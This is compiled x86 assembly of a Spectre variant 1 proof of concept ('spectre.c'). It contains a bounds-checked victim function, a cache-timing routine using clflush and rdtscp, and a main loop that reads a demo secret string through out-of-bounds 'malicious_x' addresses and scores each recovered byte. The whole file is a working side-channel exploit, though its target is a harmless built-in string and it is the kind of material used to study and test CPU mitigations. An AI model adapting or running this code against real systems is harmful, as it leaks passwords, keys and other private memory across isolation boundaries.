	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset %ebp, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register %ebp
	pushl	%eax
	calll	.L0$pb
.L0$pb:
	popl	%ecx
.Ltmp0:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp0-.L0$pb), %ecx
	movl	8(%ebp), %eax
	movl	8(%ebp), %eax
	movl	array1_size@GOTOFF(%ecx), %ecx
	cmpl	%ecx, %eax
	jae	.LBB0_2
# %bb.1:
	movl	$1, -4(%ebp)
	jmp	.LBB0_3
.LBB0_2:
	movl	$0, -4(%ebp)
.LBB0_3:
	movl	-4(%ebp), %eax
	addl	$4, %esp
	popl	%ebp
	.cfi_def_cfa %esp, 4
	retl
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset %ebp, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register %ebp
	pushl	%ebx
	subl	$20, %esp
	.cfi_offset %ebx, -12
	calll	.L1$pb
.L1$pb:
	popl	%ebx
.Ltmp1:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp1-.L1$pb), %ebx
	movl	%ebx, -8(%ebp)                  # 4-byte Spill
	movl	8(%ebp), %eax
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	calll	check
	cmpl	$0, %eax
	je	.LBB1_2
# %bb.1:
	movl	-8(%ebp), %eax                  # 4-byte Reload
	movl	8(%ebp), %ecx
	movzbl	array1@GOTOFF(%eax,%ecx), %ecx
	shll	$9, %ecx
	movzbl	array2@GOTOFF(%eax,%ecx), %edx
	movzbl	temp@GOTOFF(%eax), %ecx
	andl	%edx, %ecx
                                        # kill: def $cl killed $cl killed $ecx
	movb	%cl, temp@GOTOFF(%eax)
.LBB1_2:
	addl	$20, %esp
	popl	%ebx
	popl	%ebp
	.cfi_def_cfa %esp, 4
	retl
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset %ebp, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register %ebp
	pushl	%ebx
	pushl	%edi
	pushl	%esi
	subl	$92, %esp
	.cfi_offset %esi, -20
	.cfi_offset %edi, -16
	.cfi_offset %ebx, -12
	calll	.L2$pb
.L2$pb:
	popl	%eax
.Ltmp2:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp2-.L2$pb), %eax
	movl	%eax, -84(%ebp)                 # 4-byte Spill
	movl	16(%ebp), %eax
	movl	12(%ebp), %eax
	movl	8(%ebp), %eax
	movl	$0, -44(%ebp)
	movl	$0, -28(%ebp)
.LBB2_1:                                # =>This Inner Loop Header: Depth=1
	cmpl	$256, -28(%ebp)                 # imm = 0x100
	jge	.LBB2_4
# %bb.2:                                #   in Loop: Header=BB2_1 Depth=1
	movl	-84(%ebp), %eax                 # 4-byte Reload
	movl	-28(%ebp), %ecx
	movl	$0, readMemoryByte.results@GOTOFF(%eax,%ecx,4)
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movl	-28(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -28(%ebp)
	jmp	.LBB2_1
.LBB2_4:
	movl	$999, -24(%ebp)                 # imm = 0x3E7
.LBB2_5:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_11 Depth 2
                                        #       Child Loop BB2_13 Depth 3
                                        #     Child Loop BB2_19 Depth 2
                                        #     Child Loop BB2_26 Depth 2
	cmpl	$0, -24(%ebp)
	jle	.LBB2_42
# %bb.6:                                #   in Loop: Header=BB2_5 Depth=1
	movl	$0, -28(%ebp)
.LBB2_7:                                #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -28(%ebp)                 # imm = 0x100
	jge	.LBB2_10
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movl	-84(%ebp), %eax                 # 4-byte Reload
	movl	-28(%ebp), %ecx
	shll	$9, %ecx
	leal	array2@GOTOFF(%eax), %eax
	addl	%ecx, %eax
	clflush	(%eax)
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	movl	-28(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -28(%ebp)
	jmp	.LBB2_7
.LBB2_10:                               #   in Loop: Header=BB2_5 Depth=1
	movl	-84(%ebp), %ecx                 # 4-byte Reload
	movl	-24(%ebp), %eax
	movl	array1_size@GOTOFF(%ecx), %ecx
	cltd
	idivl	%ecx
	movl	%edx, -48(%ebp)
	movl	$29, -32(%ebp)
.LBB2_11:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_13 Depth 3
	cmpl	$0, -32(%ebp)
	jl	.LBB2_18
# %bb.12:                               #   in Loop: Header=BB2_11 Depth=2
	movl	-84(%ebp), %eax                 # 4-byte Reload
	clflush	array1_size@GOTOFF(%eax)
	movl	$0, -80(%ebp)
.LBB2_13:                               #   Parent Loop BB2_5 Depth=1
                                        #     Parent Loop BB2_11 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	movl	-80(%ebp), %eax
	cmpl	$100, %eax
	jge	.LBB2_16
# %bb.14:                               #   in Loop: Header=BB2_13 Depth=3
	jmp	.LBB2_15
.LBB2_15:                               #   in Loop: Header=BB2_13 Depth=3
	movl	-80(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -80(%ebp)
	jmp	.LBB2_13
.LBB2_16:                               #   in Loop: Header=BB2_11 Depth=2
	movl	-84(%ebp), %ebx                 # 4-byte Reload
	movl	-32(%ebp), %eax
	movl	$6, %ecx
	cltd
	idivl	%ecx
	movl	%edx, %eax
	subl	$1, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	movl	%eax, -52(%ebp)
	movl	-52(%ebp), %eax
	movl	-52(%ebp), %ecx
	shrl	$16, %ecx
	orl	%ecx, %eax
	movl	%eax, -52(%ebp)
	movl	-48(%ebp), %eax
	movl	-52(%ebp), %ecx
	movl	8(%ebp), %edx
	xorl	-48(%ebp), %edx
	andl	%edx, %ecx
	xorl	%ecx, %eax
	movl	%eax, -52(%ebp)
	movl	-52(%ebp), %eax
	movl	%eax, (%esp)
	calll	victim_function
# %bb.17:                               #   in Loop: Header=BB2_11 Depth=2
	movl	-32(%ebp), %eax
	addl	$-1, %eax
	movl	%eax, -32(%ebp)
	jmp	.LBB2_11
.LBB2_18:                               #   in Loop: Header=BB2_5 Depth=1
	movl	$0, -28(%ebp)
.LBB2_19:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -28(%ebp)                 # imm = 0x100
	jge	.LBB2_25
# %bb.20:                               #   in Loop: Header=BB2_19 Depth=2
	movl	-84(%ebp), %eax                 # 4-byte Reload
	movl	-28(%ebp), %ecx
	imull	$167, %ecx, %ecx
	addl	$13, %ecx
                                        # kill: def $cl killed $cl killed $ecx
	movzbl	%cl, %ecx
	movl	%ecx, -40(%ebp)
	movl	-40(%ebp), %ecx
	shll	$9, %ecx
	leal	array2@GOTOFF(%eax,%ecx), %eax
	movl	%eax, -76(%ebp)
	leal	-44(%ebp), %eax
	movl	%eax, -96(%ebp)                 # 4-byte Spill
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %esi
	rdtscp
	movl	%eax, %edi
	movl	-96(%ebp), %eax                 # 4-byte Reload
	movl	%edi, -92(%ebp)                 # 4-byte Spill
	movl	%ecx, %edi
	movl	-92(%ebp), %ecx                 # 4-byte Reload
	movl	%edi, (%esi)
	movl	%edx, -60(%ebp)
	movl	%ecx, -64(%ebp)
	movl	-76(%ebp), %ecx
	movzbl	(%ecx), %ecx
	movl	%ecx, -44(%ebp)
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	movl	%eax, -88(%ebp)                 # 4-byte Spill
	rdtscp
	movl	%ecx, %esi
	movl	-88(%ebp), %ecx                 # 4-byte Reload
	movl	%esi, (%ecx)
	movl	-64(%ebp), %esi
	movl	-60(%ebp), %ecx
	subl	%esi, %eax
	sbbl	%ecx, %edx
	movl	%eax, -72(%ebp)
	movl	%edx, -68(%ebp)
	movl	-72(%ebp), %esi
	movl	-68(%ebp), %ecx
	xorl	%eax, %eax
	movl	$100, %edx
	subl	%esi, %edx
	sbbl	%ecx, %eax
	jb	.LBB2_23
	jmp	.LBB2_21
.LBB2_21:                               #   in Loop: Header=BB2_19 Depth=2
	movl	-84(%ebp), %ecx                 # 4-byte Reload
	movl	-40(%ebp), %eax
	movl	%eax, -100(%ebp)                # 4-byte Spill
	movl	-24(%ebp), %eax
	movl	array1_size@GOTOFF(%ecx), %esi
	cltd
	idivl	%esi
	movl	-100(%ebp), %eax                # 4-byte Reload
	movzbl	array1@GOTOFF(%ecx,%edx), %ecx
	cmpl	%ecx, %eax
	je	.LBB2_23
# %bb.22:                               #   in Loop: Header=BB2_19 Depth=2
	movl	-84(%ebp), %eax                 # 4-byte Reload
	movl	-40(%ebp), %ecx
	movl	readMemoryByte.results@GOTOFF(%eax,%ecx,4), %edx
	addl	$1, %edx
	movl	%edx, readMemoryByte.results@GOTOFF(%eax,%ecx,4)
.LBB2_23:                               #   in Loop: Header=BB2_19 Depth=2
	jmp	.LBB2_24
.LBB2_24:                               #   in Loop: Header=BB2_19 Depth=2
	movl	-28(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -28(%ebp)
	jmp	.LBB2_19
.LBB2_25:                               #   in Loop: Header=BB2_5 Depth=1
	movl	$-1, -36(%ebp)
	movl	$-1, -32(%ebp)
	movl	$0, -28(%ebp)
.LBB2_26:                               #   Parent Loop BB2_5 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$256, -28(%ebp)                 # imm = 0x100
	jge	.LBB2_36
# %bb.27:                               #   in Loop: Header=BB2_26 Depth=2
	cmpl	$0, -32(%ebp)
	jl	.LBB2_29
# %bb.28:                               #   in Loop: Header=BB2_26 Depth=2
	movl	-84(%ebp), %ecx                 # 4-byte Reload
	movl	-28(%ebp), %eax
	movl	readMemoryByte.results@GOTOFF(%ecx,%eax,4), %eax
	movl	-32(%ebp), %edx
	cmpl	readMemoryByte.results@GOTOFF(%ecx,%edx,4), %eax
	jl	.LBB2_30
.LBB2_29:                               #   in Loop: Header=BB2_26 Depth=2
	movl	-32(%ebp), %eax
	movl	%eax, -36(%ebp)
	movl	-28(%ebp), %eax
	movl	%eax, -32(%ebp)
	jmp	.LBB2_34
.LBB2_30:                               #   in Loop: Header=BB2_26 Depth=2
	cmpl	$0, -36(%ebp)
	jl	.LBB2_32
# %bb.31:                               #   in Loop: Header=BB2_26 Depth=2
	movl	-84(%ebp), %ecx                 # 4-byte Reload
	movl	-28(%ebp), %eax
	movl	readMemoryByte.results@GOTOFF(%ecx,%eax,4), %eax
	movl	-36(%ebp), %edx
	cmpl	readMemoryByte.results@GOTOFF(%ecx,%edx,4), %eax
	jl	.LBB2_33
.LBB2_32:                               #   in Loop: Header=BB2_26 Depth=2
	movl	-28(%ebp), %eax
	movl	%eax, -36(%ebp)
.LBB2_33:                               #   in Loop: Header=BB2_26 Depth=2
	jmp	.LBB2_34
.LBB2_34:                               #   in Loop: Header=BB2_26 Depth=2
	jmp	.LBB2_35
.LBB2_35:                               #   in Loop: Header=BB2_26 Depth=2
	movl	-28(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -28(%ebp)
	jmp	.LBB2_26
.LBB2_36:                               #   in Loop: Header=BB2_5 Depth=1
	movl	-84(%ebp), %ecx                 # 4-byte Reload
	movl	-32(%ebp), %eax
	movl	readMemoryByte.results@GOTOFF(%ecx,%eax,4), %eax
	movl	-36(%ebp), %edx
	movl	readMemoryByte.results@GOTOFF(%ecx,%edx,4), %ecx
	shll	$1, %ecx
	addl	$5, %ecx
	cmpl	%ecx, %eax
	jge	.LBB2_39
# %bb.37:                               #   in Loop: Header=BB2_5 Depth=1
	movl	-84(%ebp), %eax                 # 4-byte Reload
	movl	-32(%ebp), %ecx
	cmpl	$2, readMemoryByte.results@GOTOFF(%eax,%ecx,4)
	jne	.LBB2_40
# %bb.38:                               #   in Loop: Header=BB2_5 Depth=1
	movl	-84(%ebp), %eax                 # 4-byte Reload
	movl	-36(%ebp), %ecx
	cmpl	$0, readMemoryByte.results@GOTOFF(%eax,%ecx,4)
	jne	.LBB2_40
.LBB2_39:
	jmp	.LBB2_42
.LBB2_40:                               #   in Loop: Header=BB2_5 Depth=1
	jmp	.LBB2_41
.LBB2_41:                               #   in Loop: Header=BB2_5 Depth=1
	movl	-24(%ebp), %eax
	addl	$-1, %eax
	movl	%eax, -24(%ebp)
	jmp	.LBB2_5
.LBB2_42:
	movl	-84(%ebp), %eax                 # 4-byte Reload
	movl	-44(%ebp), %ecx
	xorl	readMemoryByte.results@GOTOFF(%eax), %ecx
	movl	%ecx, readMemoryByte.results@GOTOFF(%eax)
	movl	-32(%ebp), %ecx
	movb	%cl, %dl
	movl	12(%ebp), %ecx
	movb	%dl, (%ecx)
	movl	-32(%ebp), %ecx
	movl	readMemoryByte.results@GOTOFF(%eax,%ecx,4), %edx
	movl	16(%ebp), %ecx
	movl	%edx, (%ecx)
	movl	-36(%ebp), %ecx
	movb	%cl, %dl
	movl	12(%ebp), %ecx
	movb	%dl, 1(%ecx)
	movl	-36(%ebp), %ecx
	movl	readMemoryByte.results@GOTOFF(%eax,%ecx,4), %ecx
	movl	16(%ebp), %eax
	movl	%ecx, 4(%eax)
	addl	$92, %esp
	popl	%esi
	popl	%edi
	popl	%ebx
	popl	%ebp
	.cfi_def_cfa %esp, 4
	retl
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset %ebp, -8
	movl	%esp, %ebp
	.cfi_def_cfa_register %ebp
	pushl	%ebx
	pushl	%esi
	subl	$80, %esp
	.cfi_offset %esi, -16
	.cfi_offset %ebx, -12
	calll	.L3$pb
.L3$pb:
	popl	%eax
.Ltmp3:
	addl	$_GLOBAL_OFFSET_TABLE_+(.Ltmp3-.L3$pb), %eax
	movl	%eax, -48(%ebp)                 # 4-byte Spill
	movl	12(%ebp), %eax
	movl	8(%ebp), %eax
	movl	$0, -12(%ebp)
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_3 Depth 2
                                        #     Child Loop BB3_9 Depth 2
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	calll	getchar@PLT
                                        # kill: def $al killed $al killed $eax
	movb	%al, -13(%ebp)
	movsbl	-13(%ebp), %eax
	cmpl	$114, %eax
	jne	.LBB3_22
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	secret@GOTOFF(%ebx), %ecx
	movl	secret@GOTOFF(%ebx), %eax
	leal	.L.str.1@GOTOFF(%ebx), %edx
	movl	%edx, (%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, 8(%esp)
	calll	printf@PLT
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	secret@GOTOFF(%ebx), %eax
	leal	array1@GOTOFF(%ebx), %ecx
	subl	%ecx, %eax
	movl	%eax, -20(%ebp)
	movl	secret@GOTOFF(%ebx), %ecx
	movl	%esp, %eax
	movl	%ecx, (%eax)
	calll	strlen@PLT
	movl	%eax, -32(%ebp)
	movl	$0, -40(%ebp)
.LBB3_3:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	cmpl	$131072, -40(%ebp)              # imm = 0x20000
	jae	.LBB3_6
# %bb.4:                                #   in Loop: Header=BB3_3 Depth=2
	movl	-48(%ebp), %eax                 # 4-byte Reload
	movl	-40(%ebp), %ecx
	movb	$1, array2@GOTOFF(%eax,%ecx)
# %bb.5:                                #   in Loop: Header=BB3_3 Depth=2
	movl	-40(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -40(%ebp)
	jmp	.LBB3_3
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$3, 8(%ebp)
	jne	.LBB3_8
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	12(%ebp), %eax
	movl	4(%eax), %edx
	leal	-20(%ebp), %eax
	leal	.L.str.2@GOTOFF(%ebx), %ecx
	movl	%edx, (%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, 8(%esp)
	calll	__isoc99_sscanf@PLT
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	-20(%ebp), %eax
	leal	array1@GOTOFF(%ebx), %ecx
	subl	%ecx, %eax
	movl	%eax, -20(%ebp)
	movl	12(%ebp), %eax
	movl	8(%eax), %edx
	leal	.L.str.3@GOTOFF(%ebx), %ecx
	leal	-32(%ebp), %eax
	movl	%edx, (%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, 8(%esp)
	calll	__isoc99_sscanf@PLT
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	-20(%ebp), %ecx
	movl	-32(%ebp), %eax
	leal	.L.str.4@GOTOFF(%ebx), %edx
	movl	%edx, (%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, 8(%esp)
	calll	printf@PLT
.LBB3_8:                                #   in Loop: Header=BB3_1 Depth=1
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	-32(%ebp), %eax
	leal	.L.str.5@GOTOFF(%ebx), %ecx
	movl	%ecx, (%esp)
	movl	%eax, 4(%esp)
	calll	printf@PLT
	movl	$0, -44(%ebp)
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movl	-32(%ebp), %eax
	addl	$-1, %eax
	movl	%eax, -32(%ebp)
	cmpl	$0, %eax
	jl	.LBB3_21
# %bb.10:                               #   in Loop: Header=BB3_9 Depth=2
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	-20(%ebp), %ecx
	movl	secret@GOTOFF(%ebx), %eax
	movl	-44(%ebp), %edx
	movsbl	(%eax,%edx), %eax
	leal	.L.str.6@GOTOFF(%ebx), %edx
	movl	%edx, (%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, 8(%esp)
	calll	printf@PLT
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	-44(%ebp), %eax
	addl	$1, %eax
	movl	%eax, -44(%ebp)
	movl	-20(%ebp), %edx
	movl	%edx, %eax
	addl	$1, %eax
	movl	%eax, -20(%ebp)
	leal	-34(%ebp), %ecx
	leal	-28(%ebp), %eax
	movl	%edx, (%esp)
	movl	%ecx, 4(%esp)
	movl	%eax, 8(%esp)
	calll	readMemoryByte
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	-28(%ebp), %edx
	movl	-24(%ebp), %esi
	shll	$1, %esi
	leal	.L.str.9@GOTOFF(%ebx), %eax
	leal	.L.str.8@GOTOFF(%ebx), %ecx
	cmpl	%esi, %edx
	cmovgel	%ecx, %eax
	leal	.L.str.7@GOTOFF(%ebx), %ecx
	movl	%ecx, (%esp)
	movl	%eax, 4(%esp)
	calll	printf@PLT
	movzbl	-34(%ebp), %eax
	movl	%eax, -52(%ebp)                 # 4-byte Spill
	movzbl	-34(%ebp), %eax
	cmpl	$31, %eax
	jle	.LBB3_13
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=2
	movzbl	-34(%ebp), %eax
	cmpl	$127, %eax
	jge	.LBB3_13
# %bb.12:                               #   in Loop: Header=BB3_9 Depth=2
	movzbl	-34(%ebp), %eax
	movl	%eax, -56(%ebp)                 # 4-byte Spill
	jmp	.LBB3_14
.LBB3_13:                               #   in Loop: Header=BB3_9 Depth=2
	movl	$63, %eax
	movl	%eax, -56(%ebp)                 # 4-byte Spill
	jmp	.LBB3_14
.LBB3_14:                               #   in Loop: Header=BB3_9 Depth=2
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	-52(%ebp), %edx                 # 4-byte Reload
	movl	-56(%ebp), %ecx                 # 4-byte Reload
	movl	-28(%ebp), %eax
	leal	.L.str.10@GOTOFF(%ebx), %esi
	movl	%esi, (%esp)
	movl	%edx, 4(%esp)
	movl	%ecx, 8(%esp)
	movl	%eax, 12(%esp)
	calll	printf@PLT
	cmpl	$0, -24(%ebp)
	jle	.LBB3_20
# %bb.15:                               #   in Loop: Header=BB3_9 Depth=2
	movzbl	-33(%ebp), %eax
	movl	%eax, -60(%ebp)                 # 4-byte Spill
	movzbl	-33(%ebp), %eax
	cmpl	$31, %eax
	jle	.LBB3_18
# %bb.16:                               #   in Loop: Header=BB3_9 Depth=2
	movzbl	-33(%ebp), %eax
	cmpl	$127, %eax
	jge	.LBB3_18
# %bb.17:                               #   in Loop: Header=BB3_9 Depth=2
	movzbl	-33(%ebp), %eax
	movl	%eax, -64(%ebp)                 # 4-byte Spill
	jmp	.LBB3_19
.LBB3_18:                               #   in Loop: Header=BB3_9 Depth=2
	movl	$63, %eax
	movl	%eax, -64(%ebp)                 # 4-byte Spill
	jmp	.LBB3_19
.LBB3_19:                               #   in Loop: Header=BB3_9 Depth=2
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	-60(%ebp), %edx                 # 4-byte Reload
	movl	-64(%ebp), %ecx                 # 4-byte Reload
	movl	-24(%ebp), %eax
	leal	.L.str.11@GOTOFF(%ebx), %esi
	movl	%esi, (%esp)
	movl	%edx, 4(%esp)
	movl	%ecx, 8(%esp)
	movl	%eax, 12(%esp)
	calll	printf@PLT
.LBB3_20:                               #   in Loop: Header=BB3_9 Depth=2
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	leal	.L.str.12@GOTOFF(%ebx), %eax
	movl	%eax, (%esp)
	calll	printf@PLT
	jmp	.LBB3_9
.LBB3_21:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_29
.LBB3_22:                               #   in Loop: Header=BB3_1 Depth=1
	movsbl	-13(%ebp), %eax
	cmpl	$10, %eax
	jne	.LBB3_24
# %bb.23:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_24:                               #   in Loop: Header=BB3_1 Depth=1
	movsbl	-13(%ebp), %eax
	cmpl	$105, %eax
	jne	.LBB3_26
# %bb.25:                               #   in Loop: Header=BB3_1 Depth=1
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	calll	getpid@PLT
	movl	-48(%ebp), %ebx                 # 4-byte Reload
	movl	%eax, %ecx
	leal	.L.str.13@GOTOFF(%ebx), %eax
	movl	%esp, %eax
	movl	%ecx, 12(%eax)
	leal	check@GOTOFF(%ebx), %ecx
	addl	$33, %ecx
	movl	%ecx, 4(%eax)
	leal	.L.str.13@GOTOFF(%ebx), %ecx
	movl	%ecx, (%eax)
	setb	%cl
	movzbl	%cl, %ecx
	movl	%ecx, 8(%eax)
	calll	printf@PLT
	jmp	.LBB3_27
.LBB3_26:
	jmp	.LBB3_30
.LBB3_27:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_28
.LBB3_28:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_29
.LBB3_29:                               #   in Loop: Header=BB3_1 Depth=1
	jmp	.LBB3_1
.LBB3_30:
	xorl	%eax, %eax
	addl	$80, %esp
	popl	%esi
	popl	%ebx
	popl	%ebp
	.cfi_def_cfa %esp, 4
	retl
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function
	.type	array1_size,@object             # @array1_size
	.data
	.globl	array1_size
	.p2align	2
array1_size:
	.long	16                              # 0x10
	.size	array1_size, 4

	.type	array1,@object                  # @array1
	.globl	array1
array1:
	.ascii	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	144
	.size	array1, 160

	.type	.L.str,@object                  # @.str
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str:
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.size	.L.str, 41

	.type	secret,@object                  # @secret
	.data
	.globl	secret
	.p2align	2
secret:
	.long	.L.str
	.size	secret, 4

	.type	temp,@object                    # @temp
	.bss
	.globl	temp
temp:
	.byte	0                               # 0x0
	.size	temp, 1

	.type	array2,@object                  # @array2
	.globl	array2
array2:
	.zero	131072
	.size	array2, 131072

	.type	readMemoryByte.results,@object  # @readMemoryByte.results
	.local	readMemoryByte.results
	.comm	readMemoryByte.results,1024,4
	.type	.L.str.1,@object                # @.str.1
	.section	.rodata.str1.1,"aMS",@progbits,1
.L.str.1:
	.asciz	"Putting '%s' in memory, address %p\n"
	.size	.L.str.1, 36

	.type	.L.str.2,@object                # @.str.2
.L.str.2:
	.asciz	"%p"
	.size	.L.str.2, 3

	.type	.L.str.3,@object                # @.str.3
.L.str.3:
	.asciz	"%d"
	.size	.L.str.3, 3

	.type	.L.str.4,@object                # @.str.4
.L.str.4:
	.asciz	"Trying malicious_x = %p, len = %d\n"
	.size	.L.str.4, 35

	.type	.L.str.5,@object                # @.str.5
.L.str.5:
	.asciz	"Reading %d bytes:\n"
	.size	.L.str.5, 19

	.type	.L.str.6,@object                # @.str.6
.L.str.6:
	.asciz	"Reading at malicious_x = %p secc= %c ..."
	.size	.L.str.6, 41

	.type	.L.str.7,@object                # @.str.7
.L.str.7:
	.asciz	"%s: "
	.size	.L.str.7, 5

	.type	.L.str.8,@object                # @.str.8
.L.str.8:
	.asciz	"Success"
	.size	.L.str.8, 8

	.type	.L.str.9,@object                # @.str.9
.L.str.9:
	.asciz	"Unclear"
	.size	.L.str.9, 8

	.type	.L.str.10,@object               # @.str.10
.L.str.10:
	.asciz	"0x%02X='%c' score=%d "
	.size	.L.str.10, 22

	.type	.L.str.11,@object               # @.str.11
.L.str.11:
	.asciz	"(second best: 0x%02X='%c' score=%d)"
	.size	.L.str.11, 36

	.type	.L.str.12,@object               # @.str.12
.L.str.12:
	.asciz	"\n"
	.size	.L.str.12, 2

	.type	.L.str.13,@object               # @.str.13
.L.str.13:
	.asciz	"addr = %llx, pid = %d\n"
	.size	.L.str.13, 23

	.type	unused1,@object                 # @unused1
	.bss
	.globl	unused1
unused1:
	.zero	64
	.size	unused1, 64

	.type	unused2,@object                 # @unused2
	.globl	unused2
unused2:
	.zero	64
	.size	unused2, 64

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym victim_function
	.addrsig_sym readMemoryByte
	.addrsig_sym getchar
	.addrsig_sym printf
	.addrsig_sym strlen
	.addrsig_sym __isoc99_sscanf
	.addrsig_sym getpid
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym secret
	.addrsig_sym temp
	.addrsig_sym array2
	.addrsig_sym readMemoryByte.results
